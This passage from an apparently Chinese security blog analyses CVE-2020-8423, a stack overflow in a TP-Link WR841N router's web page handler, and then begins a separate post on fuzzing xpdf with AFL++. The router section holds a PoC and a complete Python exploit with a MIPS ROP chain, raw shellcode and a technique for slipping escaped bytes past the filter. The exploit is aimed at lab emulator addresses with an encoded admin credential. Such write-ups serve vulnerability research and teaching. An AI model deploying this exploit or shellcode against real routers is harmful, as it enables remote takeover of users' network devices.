class="type">int</span>)<span class="string">"%d,"</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;v57[<span class="number">14</span>]);</span><br><span class="line">  writePageParamSet(a2, (<span class="type">int</span>)<span class="string">"%d,"</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;v57[<span class="number">15</span>]);</span><br><span class="line">  writePageParamSet(a2, (<span class="type">int</span>)<span class="string">"%d,"</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;v57[<span class="number">16</span>]);</span><br><span class="line">  httpPrintf(a2, <span class="string">"0,0 );\n&lt;/SCRIPT&gt;\n"</span>);</span><br><span class="line">  httpPrintf(a2, <span class="string">"&lt;script language=JavaScript&gt;\nvar isInScanning = 0;\n&lt;/script&gt;"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v50 &lt; <span class="number">9</span> &amp;&amp; ((<span class="number">1</span> &lt;&lt; v50) &amp; <span class="number">0x1C8</span>) != <span class="number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    HttpWebV4Head(a2, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    v10 = <span class="string">"/userRpm/popupSiteSurveyRpm_AP.htm"</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    HttpWebV4Head(a2, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    v10 = <span class="string">"/userRpm/popupSiteSurveyRpm.htm"</span>;</span><br><span class="line">  }</span><br><span class="line">LABEL_97:</span><br><span class="line">  <span class="keyword">if</span> ( httpRpmFsA(a2, v10) != <span class="number">2</span> )</span><br><span class="line">  {</span><br><span class="line">    v5 = HttpErrorPage(a2, <span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>) &lt;&lt; <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">return</span> v5 &gt;&gt; <span class="number">16</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>根据poc的输出捋了一下</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241212171551271.png" alt="image-20241212171551271"></p><p>根据函数画了ssid几个参数在栈上的位置</p><p>v57数组是dword，32位MIPS程序中占四个字节</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00</span> |</span><br><span class="line">     |   ssid</span><br><span class="line">     |   </span><br><span class="line"><span class="number">0x24</span> |   curRegion</span><br><span class="line"><span class="number">0x28</span> |   channel</span><br><span class="line"><span class="number">0x2c</span> |   chanWidth</span><br><span class="line"><span class="number">0x30</span> |   mode</span><br><span class="line"><span class="number">0x34</span> |   wrr   <span class="comment">//从wrr开始下面的值不用设置,找不到就不会设为默认值0x1产生截断</span></span><br><span class="line"><span class="string">'  '</span> '</span><br></pre></td></tr></tbody></table></figure><p>至于为什么把ssid复制给v57,后面的参数再在v57上赋值没有改变ssid的输出不是很理解，ssid理论上是被后面赋值的参数覆盖一部分的</p><p>poc</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> socks</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">default_socket = socket.socket</span><br><span class="line">socket.socket = socks.socksocket</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.verify = <span class="literal">False</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">path,cookie</span>):</span><br><span class="line">    headers = {</span><br><span class="line">            <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"</span>,</span><br><span class="line">                <span class="string">"Cookie"</span>:<span class="string">"Authorization=Basic{cookie}"</span>.<span class="built_in">format</span>(cookie=<span class="built_in">str</span>(cookie))}</span><br><span class="line">    payload=<span class="string">"/%0A"</span>*<span class="number">0x55</span> + <span class="string">"abcdefghijklmn"</span>+<span class="string">"\x78\x56\x34\x12"</span></span><br><span class="line">    <span class="comment">#这是字典设置了对应几个参数的值</span></span><br><span class="line">    params = {</span><br><span class="line">        <span class="string">"mode"</span>:<span class="string">"1000"</span>,</span><br><span class="line">                <span class="string">"curRegion"</span>:<span class="string">"1000"</span>,</span><br><span class="line">                <span class="string">"chanWidth"</span>:<span class="string">"100"</span>,</span><br><span class="line">                <span class="string">"channel"</span>:<span class="string">"1000"</span>,</span><br><span class="line">                <span class="string">"ssid"</span>:urllib.request.unquote(payload) <span class="comment">#if python3</span></span><br><span class="line">                                      <span class="comment">#urllib.unquote(payload) #if python2 (suggest)</span></span><br><span class="line">        }</span><br><span class="line">    url=<span class="string">"http://192.168.208.150:80/{path}/userRpm/popupSiteSurveyRpm_AP.htm"</span>.<span class="built_in">format</span>(path=<span class="built_in">str</span>(path))</span><br><span class="line">    resp = session.get(url,params=params,headers=headers,timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span> (resp.text)</span><br><span class="line">    <span class="built_in">print</span>(params)</span><br><span class="line"></span><br><span class="line">exp(<span class="string">"NRLABRHBAIESYOKA"</span>,<span class="string">"%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D"</span>)</span><br></pre></td></tr></tbody></table></figure><p>gdb下不了断点，暂时看不到被覆盖的寄存器</p><p>在 <strong>writePageParamSet</strong> 调用了<strong>stringModify</strong>函数，使其发生栈溢出，函数的结尾，lw了四个寄存器，可以劫持函数的执行流</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241212172752316.png" alt="image-20241212172752316"></p><p>大端序</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/t0118f33322ff3a12cd.png" alt="img"></p><p>由于调试不了stringModify函数的前后，借鉴师傅们的博客算得的sp的偏移是</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sp偏移：<span class="string">'/%0a'</span>*<span class="number">0x55</span>+<span class="number">2</span>+s0+s1+s2+ra</span><br><span class="line">payload=<span class="string">'/%0a'</span>*<span class="number">0x55</span>+<span class="number">2</span>  //经转移后长度是<span class="number">0x200</span></span><br><span class="line">payload+=s0+s1+s2</span><br><span class="line">payload+=ra</span><br></pre></td></tr></tbody></table></figure><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h5><p>由于是mips程序所以栈是可执行的，并且该程序是大端序</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241212192812056.png" alt="image-20241212192812056"></p><p>由于mips程序的指令集有<strong>（cache incoherency)缓存不一致性</strong>,branch delay slot机制使汇编不是按一条直线进行下去，后续会补充，指令cache和数据cache需要一个时间同步，需要调用sleep让shellcode从数据cache刷新到指令cache。需要构造rop，寻找gadgets，大概的流程图如下，mipsrop的构建参考：<a href="https://www.anquanke.com/post/id/179510#h2-4">路由器漏洞挖掘之 DIR-815 栈溢出漏洞分析-安全客 - 安全资讯平台</a></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/t018531348163a399e1.png" alt="image_1d96hgnfq134b1ekt12kd142q3pom.png-32.6kB"></p><p><strong>gadget1</strong>，修改寄存器$a0,$a0作为sleep函数的参数。</p><p>同时当作溢出时$ra寄存器的值，作为返回地址，跳转到$s1</p><p>s1=gadget2</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000E204                 move    $t9, $s1</span><br><span class="line">LOAD:0000E208                 jalr    $t9 ; sysconf</span><br><span class="line">LOAD:0000E20C                 li      $a0, 3</span><br></pre></td></tr></tbody></table></figure><p>gadget2，把$s2寄存器的存的地址赋给$t9并执行，这里写的是sleep函数的地址，下面还会把sp偏移的几个地址的值lw给各个寄存器，所以这里要设置好各个寄存器的值，最后会$sp的值会加0x28,返回执行ra寄存器的存的地址，这里ra寄存器设置的是gadget3的地址。</p><p>那么此时栈溢出时设置的s0几个寄存器的值和执行gadget2前的几个寄存器的值在栈上应该是这样</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#padding,刚溢出时</span></span><br><span class="line">s0=<span class="number">0x11111111</span></span><br><span class="line">s1=gadget2</span><br><span class="line">s2=fuc_sleep</span><br><span class="line">ra=gadget1     <span class="comment">#先执行ra，gadget1</span></span><br><span class="line"><span class="comment">#在执行gadget2前，预设好后面设置的寄存的值</span></span><br><span class="line"><span class="comment">#执行gadget2时的sp</span></span><br><span class="line"><span class="string">'a'</span>*<span class="number">0x1c</span>           </span><br><span class="line">s1=gadget4      <span class="comment"># 0x28+var_C($sp)</span></span><br><span class="line">s2=<span class="number">0x22222222</span></span><br><span class="line">ra=gadget3      <span class="comment"># 0x28+var_4($sp)</span></span><br><span class="line"><span class="comment">#执行完gadget2后，addiu  $+sp, 0x28 ，sp会在这个位置 </span></span><br><span class="line"><span class="string">'a'</span>*<span class="number">0x18</span></span><br><span class="line">shellcode       <span class="comment">#gadget3 addiu $a1, $sp, 0x168+var_150,把shellcode的地址$a1</span></span><br></pre></td></tr></tbody></table></figure><p><strong>gadget2</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LOAD:00037470                 move    $t9, $s2</span><br><span class="line">LOAD:00037474                 lw      $ra, 0x28+var_4($sp)</span><br><span class="line">LOAD:00037478                 lw      $s2, 0x28+var_8($sp)</span><br><span class="line">LOAD:0003747C                 lw      $s1, 0x28+var_C($sp)</span><br><span class="line">LOAD:00037480                 lw      $s0, 0x28+var_10($sp)</span><br><span class="line">LOAD:00037484</span><br><span class="line">LOAD:00037484 loc_37484:                               # DATA XREF: xdr_callhdr↓o</span><br><span class="line">LOAD:00037484                 jr      $t9 ; xdr_opaque_auth</span><br><span class="line">LOAD:00037488                 addiu   $sp, 0x28</span><br></pre></td></tr></tbody></table></figure><p><strong>gadget3</strong>，把sp+0x18的地址给$a1,sp+0x18的地址写上shellcode,然后跳转到$s1寄存器去执行，毫无疑问$s1写的就是gadget4的地址</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000E904                 addiu   $a1, $sp, 0x168+var_150</span><br><span class="line">LOAD:0000E908                 move    $t9, $s1</span><br><span class="line">LOAD:0000E90C                 jalr    $t9 ; stat64</span><br><span class="line">LOAD:0000E910                 addiu   $a0, (aErrorNetrcFile+0x28 - 0x60000)</span><br></pre></td></tr></tbody></table></figure><p><strong>gadget4</strong>，执行$a1存的地址，即shellcode的地址</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LOAD:000374D8                 move    $t9, $a1</span><br><span class="line">LOAD:000374DC                 sw      $v0, 0x4C($a0)</span><br><span class="line">LOAD:000374E0                 move    $a1, $a2</span><br><span class="line">LOAD:000374E4                 jr      $t9</span><br><span class="line">LOAD:000374E8                 addiu   $a0, 0x4C  # 'L'</span><br></pre></td></tr></tbody></table></figure><p><strong>shellcode</strong></p><p>由于指令<strong>lui</strong> 的字节码是0x3c(&lt;),会被转义，一种方式是指令逃逸，另一种是指令替换，参考师傅们的链接</p><p><a href="http://shell-storm.org/shellcode/files/shellcode-794.php">http://shell-storm.org/shellcode/files/shellcode-794.php</a><br><a href="https://www.exploit-db.com/exploits/45541">https://www.exploit-db.com/exploits/45541</a></p><p><strong>指令替换</strong></p><p>可以使用一些无关指令，如使用 <strong>ori t3,t3,0xff3c</strong> 时，<strong>3c(&lt;)</strong> 经过<strong>stringModify</strong> 函数会被编码为 <strong>\ &lt; (\x5c\x3c) </strong>,\x5c是反斜杠,  <strong>ori t3,t3,0xff3c</strong> 的汇编字节码为 <strong>‘\x35\x6b\xff\x3c’</strong> ,经转义后是 <strong>‘\x35\x6b\xff\x5c’</strong> ,\x3c就逃逸到下一个内存空间，这个3c就可以继续使用了，对于其他被转义的字符 <code>/ &gt;  &lt;  \\  "</code> 也是如此 </p><p>也就是 \x2f , \x3c,\x3e,\x5c,\x22</p><p><strong>关于gdb的调试，需要自己编译gdb上传到qemu中</strong> </p><p><strong>exp</strong></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> socks</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">default_socket=socket.socket</span><br><span class="line">socket.socket=socks.socksocket</span><br><span class="line">session=requests.Session()</span><br><span class="line">session.verify=<span class="literal">False</span></span><br><span class="line">context.endian=<span class="string">'big'</span></span><br><span class="line">libc_base=<span class="number">0x77fe2000</span></span><br><span class="line">sleep=<span class="number">0x53ac0</span></span><br><span class="line">g1=<span class="number">0x000E204</span></span><br><span class="line">g2=<span class="number">0x00037470</span></span><br><span class="line">g3=<span class="number">0x0000E904</span></span><br><span class="line">g4=<span class="number">0x00374D8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b"\x24\x0e\xff\xfd\x01\xc0\x20\x27\x01\xc0\x28\x27\x28\x06\xff\xff"</span></span><br><span class="line">shellcode+=<span class="string">b"\x24\x02\x10\x57\x01\x01\x01\x0c\xaf\xa2\xff\xff\x8f\xa4\xff\xff"</span></span><br><span class="line">shellcode+=<span class="string">b"\x34\x0e\xff\xff\x01\xc0\x70\x27\xaf\xae\xff\xf6\xaf\xae\xff\xf4"</span></span><br><span class="line">shellcode+=<span class="string">b"\x34\x0f\xd8\xf0\x01\xe0\x78\x27\xaf\xaf\xff\xf2\x34\x0f\xff\xfd"</span></span><br><span class="line">shellcode+=<span class="string">b"\x01\xe0\x78\x27\xaf\xaf\xff\xf0\x27\xa5\xff\xf2\x24\x0f\xff\xef"</span></span><br><span class="line">shellcode+=<span class="string">b"\x01\xe0\x30\x27\x24\x02\x10\x4a\x01\x01\x01\x0c\x8f\xa4\xff\xff"</span></span><br><span class="line">shellcode+=<span class="string">b"\x28\x05\xff\xff\x24\x02\x0f\xdf\x01\x01\x01\x0c\x2c\x05\xff\xff"</span></span><br><span class="line">shellcode+=<span class="string">b"\x24\x02\x0f\xdf\x01\x01\x01\x0c\x24\x0e\xff\xfd\x01\xc0\x28\x27"</span></span><br><span class="line">shellcode+=<span class="string">b"\x24\x02\x0f\xdf\x01\x01\x01\x0c\x24\x0e\x3d\x28\xaf\xae\xff\xe2"</span></span><br><span class="line">shellcode+=<span class="string">b"\x24\x0e\x77\xf9\xaf\xae\xff\xe0\x8f\xa4\xff\xe2\x28\x05\xff\xff"</span></span><br><span class="line">shellcode+=<span class="string">b"\x28\x06\xff\xff\x24\x02\x0f\xab\x01\x01\x01\x0c"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s0=p32(<span class="number">0x11111111</span>)</span><br><span class="line">s1=p32(libc_base+g2)</span><br><span class="line">s2=p32(libc_base+sleep)</span><br><span class="line">ra=p32(libc_base+g1)</span><br><span class="line">payload=<span class="string">b'/%0a'</span>*<span class="number">0x55</span>+<span class="string">b'a'</span>*<span class="number">2</span>+s0+s1+s2+ra</span><br><span class="line">payload+=<span class="string">b'a'</span>*<span class="number">0x1c</span></span><br><span class="line">payload+=p32(libc_base+g4) <span class="comment">#s1</span></span><br><span class="line">payload+=p32(<span class="number">0x22222222</span>)</span><br><span class="line">payload+=p32(libc_base+g3) <span class="comment">#ra</span></span><br><span class="line">payload+=<span class="string">b'a'</span>*<span class="number">0x18</span></span><br><span class="line">payload+=shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">path,cookie</span>):</span><br><span class="line">    headers = {</span><br><span class="line">            <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"</span>,</span><br><span class="line">                <span class="string">"Cookie"</span>:<span class="string">"Authorization=Basic{cookie}"</span>.<span class="built_in">format</span>(cookie=<span class="built_in">str</span>(cookie))}</span><br><span class="line"></span><br><span class="line">    params = {</span><br><span class="line">        <span class="string">"mode"</span>:<span class="string">"1000"</span>,</span><br><span class="line">                <span class="string">"curRegion"</span>:<span class="string">"1000"</span>,</span><br><span class="line">                <span class="string">"chanWidth"</span>:<span class="string">"100"</span>,</span><br><span class="line">                <span class="string">"channel"</span>:<span class="string">"1000"</span>,</span><br><span class="line">                <span class="string">"ssid"</span>:urllib.parse.unquote(payload)</span><br><span class="line">        }</span><br><span class="line">    url=<span class="string">"http://192.168.123.162:80/{path}/userRpm/popupSiteSurveyRpm_AP.htm"</span>.<span class="built_in">format</span>(path=<span class="built_in">str</span>(path))</span><br><span class="line">    resp = session.get(url,params=params,headers=headers,timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span> (resp.text)</span><br><span class="line"></span><br><span class="line">exp(<span class="string">"QEIFMZVBEMCABIIB"</span>,<span class="string">"%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D"</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>遇到的环境问题</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">unsquashfs.c: In function ‘read_super’:</span><br><span class="line">unsquashfs.c:<span class="number">1835</span>:<span class="number">5</span>: error: this ‘<span class="keyword">if</span>’ clause does <span class="keyword">not</span> guard... [-Werror=misleading-indentation]</span><br><span class="line"> <span class="number">1835</span> |     <span class="keyword">if</span>(swap)</span><br><span class="line">      |     ^~</span><br><span class="line">unsquashfs.c:<span class="number">1841</span>:<span class="number">9</span>: note: ...this statement, but the latter <span class="keyword">is</span> misleadingly indented <span class="keyword">as</span> <span class="keyword">if</span> it were guarded by the ‘<span class="keyword">if</span>’</span><br><span class="line"> <span class="number">1841</span> |         read_fs_bytes(fd, SQUASHFS_START, sizeof(struct squashfs_super_block),</span><br><span class="line">      |         ^~~~~~~~~~~~~</span><br><span class="line">cc1: <span class="built_in">all</span> warnings being treated <span class="keyword">as</span> errors</span><br><span class="line">make: *** [&lt;内置&gt;：unsquashfs.o] 错误 <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>解决</p><p>[issues]: <a href="https://github.com/devttys0/sasquatch/issues/48">‘if’ clause does not guard… [-Werror=misleading-indentation] · Issue #48 · devttys0/sasquatch</a></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/devttys0/sasquatch/pull/<span class="number">51.</span>patch &amp;&amp; patch -p1 &lt;<span class="number">51.</span>patch</span><br><span class="line">./build.sh</span><br></pre></td></tr></tbody></table></figure><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r: <span class="keyword">in</span> `/home/hpp/buildroot/output/build/host-tar-<span class="number">1.35</span><span class="string">': configure: error: you should not run configure as root (set FORCE_UNSAFE_CONFIGURE=1 in environment to bypass this check) See `config.log'</span> <span class="keyword">for</span> more details make: *** [package/pkg-generic.mk:<span class="number">279</span>：</span><br></pre></td></tr></tbody></table></figure><p>解决</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make FORCE_UNSAFE_CONFIGURE=<span class="number">1</span></span><br></pre></td></tr></tbody></table></figure><h5 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h5><p>[1]:<a href="https://www.anquanke.com/post/id/230259#h2-0">Mips架构下漏洞分析入门-安全客 - 安全资讯平台</a> </p><p>[2]: <a href="https://www.anquanke.com/post/id/203486#h3-6">TP-Link WR841N 栈溢出漏洞（CVE-2020-8423）分析-安全客 - 安全资讯平台</a></p><p>[3]:<a href="https://brvc3.github.io/2023/03/16/CVE-2020-8423后篇/">CVE-2020-8423后篇 | Brvc3’s Base</a></p><p>[4]:<a href="https://www.anquanke.com/post/id/179510#h2-4">路由器漏洞挖掘之 DIR-815 栈溢出漏洞分析-安全客 - 安全资讯平台</a></p><p>[5]:<a href="https://blog.csdn.net/tianxuhong/article/details/50974400">Linux系统调用Hook姿势总结_linux vfs hook-CSDN博客</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>xpdf</title>
      <link href="//posts/7e7e55f1/"/>
      <url>//posts/7e7e55f1/</url>
      
        <content type="html"><![CDATA[<p> <a href="https://www.cvedetails.com/cve/CVE-2019-13288/">CVE-2019-13288</a></p><p>搭建xpdf环境</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir fuzzing_xpdf &amp;&amp; cd fuzzing_xpdf/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 相关依赖</span></span><br><span class="line">sudo apt install build-essential</span><br><span class="line">sudo apt update &amp;&amp; sudo apt install -y build-essential gcc</span><br><span class="line"></span><br><span class="line"><span class="comment"># Download Xpdf 3.02 &amp;&amp; build Xpdf</span></span><br><span class="line">wget https://dl.xpdfreader.com/old/xpdf-<span class="number">3.02</span>.tar.gz</span><br><span class="line">tar -xvzf xpdf-<span class="number">3.02</span>.tar.gz</span><br><span class="line">cd xpdf-<span class="number">3.02</span></span><br><span class="line"></span><br><span class="line">./configure --prefix=<span class="string">"$HOME/fuzzing_xpdf/install/"</span></span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line"><span class="comment"># Download PDF examples to test Xpdf</span></span><br><span class="line">cd $HOME/fuzzing_xpdf</span><br><span class="line">mkdir pdf_examples &amp;&amp; cd pdf_examples</span><br><span class="line">wget https://github.com/mozilla/pdf.js-sample-files/raw/master/helloworld.pdf</span><br><span class="line">wget http://www.africau.edu/images/default/sample.pdf</span><br><span class="line">wget https://www.melbpc.org.au/wp-content/uploads/<span class="number">2017</span>/<span class="number">10</span>/small-example-pdf-file.pdf</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>测试Xpdf</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME/fuzzing_xpdf/xpdf-<span class="number">3.02</span>/xpdf/pdfinfo -box -meta $HOME/fuzzing_xpdf/pdf_examples/helloworld.pdf</span><br></pre></td></tr></tbody></table></figure><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241126211601210.png" alt="image-20241126211601210"></p><p>搭建fuzz环境</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y build-essential python3-dev automake cmake git flex bison libglib2<span class="number">.0</span>-dev libpixman-<span class="number">1</span>-dev python3-setuptools cargo libgtk-<span class="number">3</span>-dev</span><br><span class="line"><span class="comment"># try to install llvm 14 and install the distro default if that fails</span></span><br><span class="line">sudo apt-get install -y lld-<span class="number">14</span> llvm-<span class="number">14</span> llvm-<span class="number">14</span>-dev clang-<span class="number">14</span> || sudo apt-get install -y lld llvm llvm-dev clang</span><br><span class="line">sudo apt-get install -y gcc-$(gcc --version|head -n1|sed <span class="string">'s/\..*//'</span>|sed <span class="string">'s/.* //'</span>)-plugin-dev libstdc++-$(gcc --version|head -n1|sed <span class="string">'s/\..*//'</span>|sed <span class="string">'s/.* //'</span>)-dev</span><br><span class="line">sudo apt-get install -y ninja-build <span class="comment"># for QEMU mode</span></span><br><span class="line">sudo apt-get install -y cpio libcapstone-dev <span class="comment"># for Nyx mode</span></span><br><span class="line">sudo apt-get install -y wget curl <span class="comment"># for Frida mode</span></span><br><span class="line">sudo apt-get install -y python3-pip <span class="comment"># for Unicorn mode</span></span><br><span class="line">git clone https://github.com/AFLplusplus/AFLplusplus</span><br><span class="line">cd AFLplusplus</span><br><span class="line">make distrib</span><br><span class="line">sudo make install</span><br><span class="line"></span><br><span class="line"><span class="comment">#将afl添加到环境变量path中</span></span><br><span class="line">echo <span class="string">'export PATH=$PATH:/home/hpp/AFLplusplus'</span> &gt;&gt; ~/.bashrc</span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></tbody></table></figure><p>使用afl-clang-fast对Xpdf进行插桩</p><p>先清理掉之前Xpdf编译好的文件</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm -r $HOME/fuzzing_xpdf/install</span><br><span class="line">cd $HOME/fuzzing_xpdf/xpdf-<span class="number">3.02</span>/</span><br><span class="line">make clean</span><br></pre></td></tr></tbody></table></figure><p>编译xpdf并用 <strong>afl-clang-fast</strong> 编译器，进行插桩</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span 